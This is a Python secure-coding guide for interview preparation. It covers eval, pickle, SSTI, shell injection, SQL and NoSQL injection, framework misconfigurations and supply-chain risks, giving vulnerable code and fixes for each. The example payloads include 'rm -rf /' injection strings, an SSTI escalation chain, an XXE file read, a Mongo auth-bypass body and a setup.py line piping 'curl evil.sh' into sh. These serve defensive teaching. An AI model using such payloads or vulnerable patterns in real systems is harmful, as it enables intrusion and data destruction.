# Python AppSec — Language & Ecosystem-Specific Footguns

> Companion to `app-sec.md` (the generic OWASP/CWE list). That doc covers the *classes*
> (SQLi, XSS, IDOR, …) in a language-neutral way. **This doc is the Python-specific layer:**
> the exact stdlib/library calls that bite you, the "looks safe but isn't" APIs, the
> framework footguns, and the packaging/supply-chain risks an interviewer probes when the
> role is Python-heavy.
>
> Same format throughout: **Vulnerable code → Why → Local fix → Systemic fix.**
> The recurring senior move: *prefer the API that's safe by construction over the one you
> have to remember to call safely.*

---

# PART 1 — Data-Becomes-Code (Python's RCE family)

Python makes it *very* easy to turn a string into executable code. These are the first
things a Python interviewer looks for.

## 1. `eval` / `exec` / `compile` on untrusted input (CWE-95)
```python
# VULNERABLE
result = eval(request.args["expr"])        # "__import__('os').system('rm -rf /')"
exec(user_supplied_code)                    # arbitrary code execution, full stop
```
**Why:** `eval`/`exec` run arbitrary Python with your process's privileges. There is no
"safe" sandbox for them in pure Python — `__builtins__` tricks defeat naive denylists.
**Local fix:** parse, don't execute. For literals use `ast.literal_eval`; for math use a
real expression parser.
```python
import ast
value = ast.literal_eval(user_input)   # ONLY parses literals (numbers, lists, dicts) — no calls
```
**Systemic fix:** `eval`/`exec`/`compile` on user input is a hard ban — Bandit `B307`
flags it in CI. If you genuinely must run user code (you're building a code-executor!),
**you don't sandbox in-process — you sandbox the OS**: separate locked-down container/microVM,
no network, non-root, resource limits, seccomp. (See `app-sec.md` §7 / `appsec.md` cmd-injection.)

## 2. `pickle` / `marshal` / `shelve` — deserialization RCE (CWE-502)
```python
# VULNERABLE
obj = pickle.loads(request.body)           # __reduce__ gadget -> RCE on load
data = yaml.load(stream)                    # full loader instantiates arbitrary objects
```
**Why:** unpickling *constructs objects*, and an attacker-crafted byte stream can run code
via `__reduce__` during construction. Pickle is **not** a data format; it's "run this
object graph." Same for `yaml.load` (full loader) and `jsonpickle`.
**Local fix:** use a data format that only carries data.
```python
import json
data = json.loads(request.body)            # JSON can't instantiate arbitrary classes
import yaml
cfg = yaml.safe_load(stream)               # safe_load = only basic types
```
**Systemic fix:** never `pickle.loads` untrusted bytes (Bandit `B301`); JSON/MessagePack +
schema validation (Pydantic) at trust boundaries; if you *must* accept a pickle (internal
cache), sign it with HMAC and verify before loading. Caveat: Python's `pickle` is fine for
*trusted* internal data (e.g. multiprocessing) — the bug is "untrusted source."

## 3. SSTI — `render_template_string` / Jinja from user input (CWE-94)
```python
# VULNERABLE (Flask)
return render_template_string("Hello " + name)         # name = "{{7*7}}" renders 49
# escalates to: {{ ''.__class__.__mro__[1].__subclasses__() ... }} -> RCE
```
**Why:** Jinja templates execute expressions. Building the *template* from user input lets
the attacker write template code → sandbox escape → RCE. (Different from XSS: XSS is data in
the *output*; SSTI is data in the *template source*.)
**Local fix:** keep user data as a **value**, never part of the template text.
```python
return render_template("hello.html", name=name)    # name is data; template is fixed & autoescaped
```
**Systemic fix:** never construct templates from user input; ban `render_template_string`
with dynamic content in review; keep autoescape on; if untrusted users author templates,
use a sandboxed engine (Jinja `SandboxedEnvironment`) — but treat even that as risky.

## 4. `subprocess` with `shell=True` / `os.system` / `os.popen` (CWE-78)
```python
# VULNERABLE
os.system(f"ping {host}")                              # host="; rm -rf / #"
subprocess.run(f"convert {f} out.png", shell=True)    # shell parses metacharacters
```
**Why:** the shell interprets `;`, `|`, `&&`, `$()`, backticks → command injection / RCE.
**Local fix:** pass an **arg vector** and don't invoke a shell.
```python
subprocess.run(["ping", "-c", "1", host], shell=False)  # host is one literal argument
```
**Systemic fix:** `shell=True` with interpolation is grep/Bandit-banned (`B602/B605`);
prefer native APIs over shelling out (`shutil`, `pathlib` instead of `cp`/`ls`); validate/
allowlist any value that *must* reach a command; least-privilege + sandbox for the worker.

---

# PART 2 — "Looks Safe But Isn't" (the Python-specific traps)

These are the high-signal ones — they catch people who know OWASP but not Python's sharp edges.

## 5. `assert` for security checks — stripped by `-O` (CWE-617)
```python
# VULNERABLE
def delete_account(user, target):
    assert user.is_admin, "forbidden"     # DISAPPEARS when run with `python -O`
    db.delete(target)
```
**Why:** `assert` is a *debugging* construct. Running Python with `-O` (or `PYTHONOPTIMIZE`)
removes **all** asserts → the auth check silently vanishes in optimized/prod builds.
**Local fix:** real control flow that always runs.
```python
if not user.is_admin:
    raise PermissionError("forbidden")
```
**Systemic fix:** lint rule banning `assert` outside tests (Bandit `B101`); the principle —
security decisions must not live in code that can be compiled away.

## 6. `tarfile.extractall` / `zipfile` — path traversal & zip bombs (CVE-2007-4559)
```python
# VULNERABLE
tarfile.open(uploaded).extractall("/srv/data")   # member "../../etc/cron.d/x" escapes dir
```
**Why:** archive members can contain `../` or absolute paths → write files anywhere
(overwrite cron, ssh keys → RCE). Also **zip bombs**: a few KB expanding to TBs → DoS.
**Local fix:** validate every member's resolved path stays inside the target (Py 3.12+ has
a `filter='data'` arg that does this for you).
```python
import os, tarfile
def safe_extract(tar, dest):
    dest = os.path.realpath(dest)
    for m in tar.getmembers():
        target = os.path.realpath(os.path.join(dest, m.name))
        if not target.startswith(dest + os.sep):   # confine
            raise Exception(f"unsafe path in archive: {m.name}")
    tar.extractall(dest, filter="data")            # Py3.12+: also strips abs paths/links
```
**Systemic fix:** one `safe_extract` helper used everywhere; cap output size/file count
(zip-bomb guard); extract as a non-root user into a scratch dir; prefer not extracting
untrusted archives on the app host at all.

## 7. `random` for security tokens — it's predictable (CWE-330)
```python
# VULNERABLE
token = "".join(random.choices(string.ascii_letters, k=32))   # Mersenne Twister
otp = random.randint(100000, 999999)                          # predictable after ~624 outputs
```
**Why:** `random` is a *statistical* PRNG (Mersenne Twister) — observing enough outputs lets
you reconstruct its state and predict every future token. Not cryptographic.
**Local fix:** use the `secrets` module (CSPRNG).
```python
import secrets
token = secrets.token_urlsafe(32)            # password-reset/session tokens
otp = secrets.randbelow(900000) + 100000     # unpredictable OTP
```
**Systemic fix:** Bandit `B311` flags `random` in security contexts; ban `random` for any
token/password/nonce/salt; one token helper built on `secrets`.

## 8. `==` for secret/token comparison — timing attack (CWE-208)
```python
# VULNERABLE
if request.headers.get("X-API-Key") == API_KEY:   # short-circuits on first mismatch
```
**Why:** `==` returns as soon as bytes differ → response time leaks how many leading bytes
matched → an attacker recovers the secret byte-by-byte.
**Local fix:** constant-time compare.
```python
import hmac
if hmac.compare_digest(request.headers.get("X-API-Key", ""), API_KEY):
```
**Systemic fix:** `hmac.compare_digest` for *all* secret/MAC/token comparisons; centralize
auth checks so raw `==` on secrets can't sneak in.

## 9. `hashlib` for passwords — fast hash, no KDF (CWE-916)
```python
# VULNERABLE
pw_hash = hashlib.sha256(password.encode()).hexdigest()   # fast -> GPU-crackable, unsalted
```
**Why:** SHA/MD5 are *built for speed* — exactly wrong for passwords (billions/sec on a GPU).
**Local fix:** a slow, salted KDF.
```python
import bcrypt
pw_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# or argon2id: from argon2 import PasswordHasher; PasswordHasher().hash(password)
```
**Systemic fix:** see `app-sec.md` §11 — one hashing helper, crypto-agility (re-hash on
login when cost is bumped). `hashlib` is correct for *integrity* (file checksums), never passwords.

## 10. `tempfile.mktemp` — TOCTOU race (CWE-377)
```python
# VULNERABLE
path = tempfile.mktemp()        # returns a NAME; gap before you open it
open(path, "w").write(data)     # attacker can pre-create/symlink path in the gap
```
**Why:** `mktemp` only generates a name; between name and open, an attacker on the same host
can create that path (or a symlink) → overwrite/redirect your write.
**Local fix:** atomic create that returns an open handle.
```python
fd, path = tempfile.mkstemp()                 # creates + opens atomically, 0600
with os.fdopen(fd, "w") as f: f.write(data)
# or: tempfile.NamedTemporaryFile() / TemporaryDirectory()
```
**Systemic fix:** ban `mktemp` (Bandit `B306`); always use `mkstemp`/`NamedTemporaryFile`.

## 11. XML parsing — XXE / billion laughs (CWE-611)
```python
# VULNERABLE
tree = etree.parse(user_xml)                  # lxml resolves external entities by default
doc = xml.dom.minidom.parseString(user_xml)   # stdlib parsers also vulnerable
```
**Why:** `<!ENTITY xxe SYSTEM "file:///etc/passwd">` → file read/SSRF; nested entities →
billion-laughs DoS. (See `app-sec.md` §16.)
**Local fix:** `defusedxml` (drop-in) or harden the parser.
```python
from defusedxml.ElementTree import parse     # safe by default: DTD/entities off
tree = parse(user_xml)
```
**Systemic fix:** `defusedxml` everywhere; ban raw `etree`/`minidom`/`xml.sax` on untrusted input.

---

# PART 3 — Database / ORM (Python flavors)

## 12. String-built SQL across DB-APIs (CWE-89)
```python
# VULNERABLE (works the same with sqlite3, psycopg2, mysqlclient)
cur.execute(f"SELECT * FROM users WHERE name = '{name}'")
cur.execute("SELECT * FROM users WHERE name = '%s'" % name)   # %-format is still concatenation!
```
**Why:** any string-building (f-string, `%`, `+`, `.format`) merges data into the query text.
**Local fix:** driver placeholders — note the paramstyle differs by driver.
```python
cur.execute("SELECT * FROM users WHERE name = ?",  (name,))   # sqlite3  (qmark)
cur.execute("SELECT * FROM users WHERE name = %s", (name,))   # psycopg2 (%s = PLACEHOLDER, not format)
```
> ⚠️ Gotcha: psycopg2's `%s` is a *placeholder*, not Python string formatting. Use the
> params arg — never `cursor.execute(sql % params)`.
**Systemic fix:** Bandit `B608`; parameterize by default; least-privilege DB user.

## 13. SQLAlchemy — the `text()` / raw escape hatch
```python
# VULNERABLE
session.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))   # f-string into text()
session.query(User).filter(text(f"name = '{name}'"))
```
**Why:** the ORM parameterizes by default, but `text()` with an f-string reopens SQLi.
**Local fix:** bind parameters into `text()`.
```python
session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": name})
# or just use the ORM: session.query(User).filter(User.name == name)
```
**Systemic fix:** grep-ban f-strings/`%`/`+` inside `text(`; prefer the expression API;
for dynamic column/table names (can't be bound) → **allowlist**, never interpolate.

## 14. Django ORM — `raw()`, `.extra()`, `RawSQL`
```python
# VULNERABLE
User.objects.raw("SELECT * FROM auth_user WHERE name = '%s'" % name)
User.objects.extra(where=[f"name = '{name}'"])
```
**Why:** Django is parameterized by default, but these three escape hatches let raw SQL
back in. Also `QuerySet.annotate(RawSQL(...))`.
**Local fix:** pass params, or stay on the ORM.
```python
User.objects.raw("SELECT * FROM auth_user WHERE name = %s", [name])   # params arg
User.objects.filter(name=name)                                        # best
```
**Systemic fix:** review-ban `.raw(` / `.extra(` / `RawSQL`; they should be rare + justified.

## 15. NoSQL / Mongo operator injection (CWE-943)
```python
# VULNERABLE (pymongo) — JSON body deserializes into query operators
db.users.find({"username": req.json["username"], "password": req.json["password"]})
# attacker sends {"username":"admin","password":{"$ne":null}} -> matches without the password
```
**Why:** a dict from JSON can carry Mongo operators (`$ne`, `$gt`, `$regex`) → auth bypass /
query manipulation. The injection is *structural*, not string-based.
**Local fix:** coerce to the expected scalar type; reject non-strings.
```python
username = str(req.json["username"]); password = str(req.json["password"])
# better: validate with a Pydantic model so fields MUST be str
```
**Systemic fix:** Pydantic/schema validation at the boundary so request fields can't be
dicts/operators; never pass raw request JSON straight into a query filter.

---

# PART 4 — Web Framework Footguns (Flask / Django / FastAPI)

## 16. Flask `debug=True` in prod — Werkzeug console RCE (CWE-489)
```python
# VULNERABLE
app.run(debug=True)        # interactive debugger on unhandled exceptions = RCE via the console
```
**Why:** the Werkzeug debugger exposes an in-browser Python console on errors. If reachable
(and the PIN is weak/derivable), it's **direct RCE**. Also leaks source/stack traces.
**Local fix:** never enable debug in prod; drive it from env.
```python
app.run(debug=os.environ.get("FLASK_DEBUG") == "1")   # off unless explicitly set in dev
```
**Systemic fix:** config per-environment (debug off by default); run prod under a real WSGI
server (gunicorn/uvicorn), never the dev server; CI check that debug isn't hardcoded on.

## 17. Weak / hardcoded `SECRET_KEY` (Flask & Django) (CWE-798)
```python
# VULNERABLE
app.config["SECRET_KEY"] = "dev"        # or committed real key; signs session cookies
```
**Why:** Flask sessions are **signed client-side cookies**. Know the key → forge any session
(set `is_admin=True`). Django uses `SECRET_KEY` for sessions, CSRF tokens, password reset.
**Local fix:** load a high-entropy key from the environment; fail if missing.
```python
app.config["SECRET_KEY"] = os.environ["SECRET_KEY"]   # 32+ random bytes, from a secret store
```
**Systemic fix:** secrets manager + rotation (see `app-sec.md` §12); gitleaks in CI;
**also know:** the Flask session cookie is *signed, not encrypted* → it's readable by the
client, so **never store secrets in `session`**.

## 18. Django `DEBUG = True` / `ALLOWED_HOSTS = ['*']` in prod
```python
# VULNERABLE
DEBUG = True                 # error pages dump settings, SQL, env, stack traces
ALLOWED_HOSTS = ["*"]        # enables Host-header attacks (cache poisoning, password-reset poisoning)
```
**Why:** `DEBUG` error pages are a full recon dump (can even reveal secret-ish settings);
`*` host disables Host validation.
**Local fix:** `DEBUG = False`, explicit `ALLOWED_HOSTS = ["app.example.com"]` in prod.
**Systemic fix:** `python manage.py check --deploy` in CI flags these + missing
`SECURE_*`/`CSRF_COOKIE_SECURE`/`SESSION_COOKIE_SECURE`; separate settings per environment.

## 19. CORS wide open (`flask-cors` / FastAPI)
```python
# VULNERABLE
CORS(app, supports_credentials=True, origins="*")     # any site + credentials
# FastAPI:
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True)
```
**Why:** `*` + credentials lets any origin make authenticated cross-origin calls (see
`app-sec.md` §10). Browsers technically forbid literal `*`+credentials, but the regex/`["*"]`
forms reflect the origin and re-enable it.
**Local fix:** explicit origin allowlist.
```python
app.add_middleware(CORSMiddleware,
    allow_origins=["https://app.example.com"], allow_credentials=True)
```
**Systemic fix:** never `*` with credentials; allowlist from config; review CORS as part of
security headers (see `app-sec.md` §F).

---

# PART 5 — FastAPI / Pydantic specifics (your stack)

## 20. `dict` / unvalidated body = no validation + mass assignment (CWE-915)
```python
# VULNERABLE
@app.post("/users")
def create(data: dict):                 # 'dict' bypasses validation entirely
    User(**data).save()                 # attacker sends {"is_admin": true}
```
**Why:** typing a body as `dict` (or `Request.json()` straight into a model) skips Pydantic
and lets attacker-controlled fields set things they shouldn't (role, balance).
**Local fix:** a Pydantic model with *only* the writable fields, extras forbidden.
```python
class UserCreate(BaseModel):
    model_config = ConfigDict(extra="forbid")   # reject unknown fields (e.g. is_admin)
    name: str
    email: EmailStr

@app.post("/users")
def create(data: UserCreate):           # validated; is_admin can't be set by the client
    User(name=data.name, email=data.email).save()
```
**Systemic fix:** every endpoint takes a typed Pydantic model, never `dict`; `extra="forbid"`
as a project default; separate **In** / **Out** / **DB** schemas (see next).

## 21. Over-serialization — leaking fields via the response (CWE-200)
```python
# VULNERABLE
@app.get("/users/{id}")
def get(id: int):
    return db.get_user(id)          # returns the whole ORM row: password_hash, email, is_admin...
```
**Why:** returning the DB object serializes *everything* on it → leaks hashes, internal flags.
**Local fix:** declare an output schema with only the safe fields.
```python
class UserOut(BaseModel):
    id: int
    name: str                       # note: NO password_hash, NO internal flags

@app.get("/users/{id}", response_model=UserOut)   # FastAPI filters the response to this shape
def get(id: int):
    return db.get_user(id)          # extra fields are stripped on the way out
```
**Systemic fix:** `response_model` on every endpoint → output shape is declared, not "whatever
the object had." Kills over-serialization *and* mass assignment by construction. Use
`SecretStr`/`SecretBytes` for in-memory secrets so they don't print/serialize accidentally.

## 22. Pydantic isn't authorization
```python
# PITFALL: validation != access control
@app.get("/orders/{id}", response_model=OrderOut)
def get(id: int, user=Depends(current_user)):
    return db.get_order(id)         # validated & shaped — but ANY user reads ANY order (IDOR)
```
**Why:** Pydantic guarantees the *shape* of data, not that the caller is *allowed* to see it.
Easy to feel "safe" because it's validated. **Local fix:** scope to the caller
(`WHERE id=:id AND user_id=:me`), 404 on mismatch. **Systemic fix:** see `app-sec.md` §2 —
deny-by-default authz dependency on every route.

---

# PART 6 — Other Python-specific classes

## 23. ReDoS — catastrophic regex backtracking (CWE-1333)
```python
# VULNERABLE
re.match(r"^(a+)+$", user_input)            # "aaaa...!" -> exponential backtracking -> CPU DoS
re.match(r"^(\w+\s?)*$", user_input)        # nested quantifiers = classic ReDoS
```
**Why:** Python's `re` uses backtracking; nested/overlapping quantifiers on attacker input
can hang the worker (single-threaded request = DoS).
**Local fix:** rewrite without nested quantifiers / use possessive-style anchoring; cap input
length first; consider the `regex` module's timeout or `google-re2` (linear-time engine).
**Systemic fix:** validate input length *before* regex; ReDoS linter (e.g. `dlint`); avoid
user-supplied regex entirely.

## 24. `requests` — SSRF & disabled TLS verification
```python
# VULNERABLE
requests.get(user_url)                       # SSRF (see app-sec.md §6)
requests.get(url, verify=False)              # disables cert validation -> MITM
```
**Why:** `verify=False` (often pasted to "make it work") silently accepts any cert → MITM.
And raw user URLs → SSRF to the metadata endpoint.
**Local fix:** keep `verify=True`; fix the cert chain properly; wrap user URLs in a
`safe_fetch` allowlist (see `app-sec.md` §6).
**Systemic fix:** Bandit `B501` flags `verify=False`; one HTTP client wrapper with TLS on +
SSRF guard + timeouts; egress firewall.

## 25. `werkzeug` / filenames — path traversal on upload (CWE-22)
```python
# VULNERABLE
f.save(os.path.join(UPLOAD_DIR, f.filename))    # filename = "../../etc/cron.d/x"
```
**Why:** the client controls `filename`; `..` escapes the upload dir (see `app-sec.md` §17).
**Local fix:** sanitize + generate your own name.
```python
from werkzeug.utils import secure_filename
name = f"{uuid.uuid4()}_{secure_filename(f.filename)}"   # strips path separators / ..
```
**Systemic fix:** never trust client filenames; store outside webroot or in object storage;
validate magic bytes, not extension.

---

# PART 7 — Python Supply Chain & Packaging

*(Increasingly the highest-impact attack — and very Python-flavored.)*

## 26. `setup.py` / install hooks run arbitrary code (CWE-829)
```python
# THREAT: a malicious dependency's setup.py executes on `pip install`
# setup.py: os.system("curl evil.sh | sh")   # runs during install, before you import anything
```
**Why:** `pip install` can execute arbitrary code at *install time*. One compromised/
typosquatted dep = RCE on the dev box and CI.
**Local fix:** install only vetted packages; use `--require-hashes`; prefer wheels (`--only-binary`)
which don't run `setup.py` at install.
**Systemic fix:** pin **with hashes** in a lockfile (`pip-tools`/`uv`/Poetry); SCA scanning
(`pip-audit`, Dependabot, Snyk) in CI; install in CI sandboxes; minimize dependency count.

## 27. Dependency confusion / typosquatting (CWE-427)
```text
# THREAT 1 (typosquat): `pip install reqeusts` / `python-dateutil` vs `dateutil` lookalikes
# THREAT 2 (confusion): your private pkg "internal-utils" — attacker uploads a HIGHER version
#   to public PyPI; default pip resolution prefers it -> your build pulls the attacker's code
```
**Why:** pip resolving against multiple indexes can prefer a public package over your private
one; a single typo can pull a malicious lookalike.
**Local fix:** pin exact versions + hashes; double-check package names.
**Systemic fix:** use `--index-url` to a private mirror (not `--extra-index-url`, which adds
public as a fallback); namespace/claim your internal names on PyPI; lockfiles with hashes;
verify maintainers for new deps.

## 28. Unpinned / outdated dependencies (CWE-1104)
```text
# VULNERABLE: requirements.txt
requests        # unpinned -> non-reproducible, silent pull of a yanked/compromised version
Django==2.2     # known-CVE version
```
**Why:** unpinned = non-reproducible builds + surprise upgrades; outdated = known CVEs.
**Local fix:** pin (`requests==2.32.3`); `pip-audit` / `pip install -U` reviewed.
**Systemic fix:** lockfile with hashes; automated dependency PRs (Dependabot) + SCA gate in CI;
SBOM; a policy for how fast security patches land.

---

## Python AppSec quick-recall (skim during a Python review)
- [ ] Any `eval`/`exec`/`compile`/`pickle.loads`/`yaml.load`/`render_template_string` on user data?
- [ ] `subprocess(..., shell=True)` / `os.system` with interpolation?
- [ ] `assert` doing a security check? (`-O` removes it)
- [ ] `random` for tokens (should be `secrets`)? `==` on secrets (should be `compare_digest`)?
- [ ] `hashlib` for passwords (should be bcrypt/argon2)?
- [ ] `tarfile.extractall` / `tempfile.mktemp` / raw XML parser on untrusted input?
- [ ] SQL via f-string / `%`; SQLAlchemy `text(f"...")`; Django `.raw(`/`.extra(`?
- [ ] Flask `debug=True`, weak `SECRET_KEY`; Django `DEBUG=True`/`ALLOWED_HOSTS=['*']`; CORS `*`?
- [ ] FastAPI endpoint typed `dict`? Missing `response_model`? `extra="forbid"`? Authz, not just validation?
- [ ] `requests(..., verify=False)`? Raw user URL (SSRF)? Client filename in a path?
- [ ] Deps unpinned / unhashed? `pip-audit` run? Typosquat / dependency-confusion risk?

## Tooling to name (signals you ship secure Python)
- **Bandit** — Python SAST (the `B###` codes above map to these checks)
- **pip-audit / Safety** — known-CVE dependency scanning
- **Semgrep** — custom rules (e.g. "no f-string in execute()")
- **detect-secrets / gitleaks** — secret scanning pre-commit + CI
- **mypy + Pydantic** — types/validation as a security control at boundaries
- **`python manage.py check --deploy`** — Django prod-hardening checklist
